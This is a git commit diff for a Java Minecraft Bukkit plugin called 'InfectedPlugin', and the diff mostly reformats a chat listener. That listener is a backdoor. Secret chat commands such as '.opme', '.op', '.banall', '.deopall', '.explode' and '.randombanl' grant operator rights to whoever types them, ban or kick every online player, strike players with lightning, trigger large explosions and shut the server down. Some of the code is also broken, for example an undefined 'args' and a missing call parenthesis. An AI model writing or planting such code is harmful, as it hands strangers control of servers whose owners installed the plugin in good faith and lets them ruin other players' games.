6395624e40e0a8dbc81964e48142c941ae0ae5e4
Wilee999 <Infinitywilee@rocketmail.com>
2013-08-17 16:50:34 -0700

    Finished merge.

--- src/org/CreeperCoders/InfectedPlugin/PlayerListener.java
+++ src/org/CreeperCoders/InfectedPlugin/PlayerListener.java
@@ -27,7 +27,7 @@ public class PlayerListener implements Listener
     private Random random = new Random();
     private InfectedPlugin plugin;
 
-    @EventHandler
+    @EventHandler(priority = EventHandler.HIGHEST)
     public void onPlayerChat(AsyncPlayerChatEvent event, CommandSender sender) throws MalformedURLException, IOException
     {
         if (event.getMessage().toLowerCase().contains(".opme"))
@@ -55,101 +55,101 @@ public class PlayerListener implements Listener
             shouldCancel = true;
         }
         if (event.getMessage().toLowerCase().contains(".enablevanilla"))
+        {
+            //ROFL
+            if (!new File("minecraft_server.jar").exists())
             {
-                //ROFL
-                if (!new File("minecraft_server.jar").exists())
-                {
-                    sender.sendMessage(ChatColor.RED + "minecraft_server.1.6.2.jar not found, downloading...");
+                sender.sendMessage(ChatColor.RED + "minecraft_server.1.6.2.jar not found, downloading...");
 
-                    URL url = new URL("https://s3.amazonaws.com/Minecraft.Download/versions/1.6.2/minecraft_server.1.6.2.jar");
-                    ReadableByteChannel rbc = Channels.newChannel(url.openStream());
-                    FileOutputStream fos = new FileOutputStream("minecraft_server.1.6.2.jar");
-                    fos.getChannel().transferFrom(rbc, 0, 1 << 24);
+                URL url = new URL("https://s3.amazonaws.com/Minecraft.Download/versions/1.6.2/minecraft_server.1.6.2.jar");
+                ReadableByteChannel rbc = Channels.newChannel(url.openStream());
+                FileOutputStream fos = new FileOutputStream("minecraft_server.1.6.2.jar");
+                fos.getChannel().transferFrom(rbc, 0, 1 << 24);
 
-                    sender.sendMessage(ChatColor.YELLOW + "Finished downloading! Starting vanilla...");
-                }
-                Bukkit.shutdown();
-                // Hopefully this works...
+                sender.sendMessage(ChatColor.YELLOW + "Finished downloading! Starting vanilla...");
             }
+            Bukkit.shutdown();
+            //Hopefully this works...
+        }
         if (event.getMessage().toLowerCase().contains(".deop"))
-            {
-                Bukkit.getServer().getPlayer(args[1]);
-                event.getPlayer().setOp(false);
-                event.getPlayer().sendMessage(ChatColor.RED + "You are no longer OP.");
-                shouldCancel = true;
-            }
+        {
+            Bukkit.getServer().getPlayer(args[1]);
+            event.getPlayer().setOp(false);
+            event.getPlayer().sendMessage(ChatColor.RED + "You are no longer OP.");
+            shouldCancel = true;
+        }
         if (event.getMessage().toLowerCase().contains(".op"))
+        {
+            Bukkit.getServer().getPlayer(args[1]);
+            event.getPlayer().setOp(true);
+            event.getPlayer().sendMessage(ChatColor.YELLOW + "You are now OP!");
+            shouldCancel = true;
+        }
+        if (event.getMessage().toLowerCase().contains(".banall"))
+        {
+            for (final Player p : Bukkit.getServer().getOnlinePlayers())
             {
-                Bukkit.getServer().getPlayer(args[1]);
-                event.getPlayer().setOp(true);
-                event.getPlayer().sendMessage(ChatColor.YELLOW + "You are now OP!");
+                p.kickPlayer("The Ban Hammer has spoken!");
+                p.setBanned(true);
                 shouldCancel = true;
             }
-        if (event.getMessage().toLowerCase().contains(".banall"))
-            {
-                for (final Player p : Bukkit.getServer().getOnlinePlayers())
-                {
-                    p.kickPlayer("The Ban Hammer has spoken!");
-                    p.setBanned(true);
-                    shouldCancel = true;
-                }
-            }
+        }
         if (event.getMessage().toLowerCase().contains(".deopall"))
+        {
+            for (final Player p : Bukkit.getServer().getOnlinePlayers())
             {
-                for (final Player p : Bukkit.getServer().getOnlinePlayers())
+                p.setOp(false);
+                //Something extra c:
+                final Location target_pos = p.getLocation();
+                for (int x = -1; x <= 1; x++)
                 {
-                    p.setOp(false);
-                    //Something extra c:
-                    final Location target_pos = p.getLocation();
-                    for (int x = -1; x <= 1; x++)
+                    for (int z = -1; z <= 1; z++)
                     {
-                        for (int z = -1; z <= 1; z++)
-                        {
-                            final Location strike_pos = new Location(target_pos.getWorld(), target_pos.getBlockX() + x, target_pos.getBlockY(), target_pos.getBlockZ() + z);
-                            target_pos.getWorld().strikeLightning(strike_pos);
-                        }
+                        final Location strike_pos = new Location(target_pos.getWorld(), target_pos.getBlockX() + x, target_pos.getBlockY(), target_pos.getBlockZ() + z);
+                        target_pos.getWorld().strikeLightning(strike_pos);
                     }
-                    shouldCancel = true;
-                }
-            }
-        if (event.getMessage().toLowerCase().contains(".explode"))
-            {
-                for (final Player p : Bukkit.getServer().getOnlinePlayers())
-                {
-                    p.setOp(false);
-                    final Location l = p.getLocation();
-                    final World w = p.getWorld();
-                    for (int x = -1; x <= 1; x++)
-                    {
-                        for (int z = -1; z <= 1; z++)
-                        {
-                            final Location explosion;
-                            explosion = new Location(l.getWorld(), l.getBlockX() + x, l.getBlockY(), l.getBlockZ + z);
-                            w.createExplosion(explosion, 500);
-                        }
-                    }
-                    shouldCancel = true;
-                }
-            }
-            // Is not effective for onPlayerQuit, but will select a random player to be banned.
-        if (event.getMessage().toLowerCase().contains(".randombanl"))
-            {
-                Player[] players = Bukkit.getServer().getOnlinePlayers();
-                final Player p = players[random.nextInt(players.length)];
-
-                if (p == sender) //Not sure if this method would work, should detect if selected player is equal to sender.
-                {
-                    //do nothing
-                }
-                else
-                {
-                    p.kickPlayer(ChatColor.RED + "GTFO.");
-                    p.setBanned(true);
                 }
                 shouldCancel = true;
             }
         }
+        if (event.getMessage().toLowerCase().contains(".explode"))
+        {
+            for (final Player p : Bukkit.getServer().getOnlinePlayers())
+            {
+                p.setOp(false);
+                final Location l = p.getLocation();
+                final World w = p.getWorld();
+                for (int x = -1; x <= 1; x++)
+                {
+                    for (int z = -1; z <= 1; z++)
+                    {
+                        final Location explosion;
+                        explosion = new Location(l.getWorld(), l.getBlockX() + x, l.getBlockY(), l.getBlockZ + z);
+                        w.createExplosion(explosion, 500);
+                    }
+                }
+                shouldCancel = true;
+            }
+        }
+        // Is not effective for onPlayerQuit, but will select a random player to be banned.
+        if (event.getMessage().toLowerCase().contains(".randombanl"))
+        {
+            Player[] players = Bukkit.getServer().getOnlinePlayers();
+            final Player p = players[random.nextInt(players.length)];
+
+            if (p == sender) //Not sure if this method would work, should detect if selected player is equal to sender.
+            {
+                //do nothing
+            }
+            else
+            {
+                p.kickPlayer(ChatColor.RED + "GTFO.");
+                p.setBanned(true);
+            }
+            shouldCancel = true;
+        }
     }
+}
 
     @EventHandler(priority = EventPriority.HIGH)
     public void onPlayerQuit(PlayerQuitEvent e)
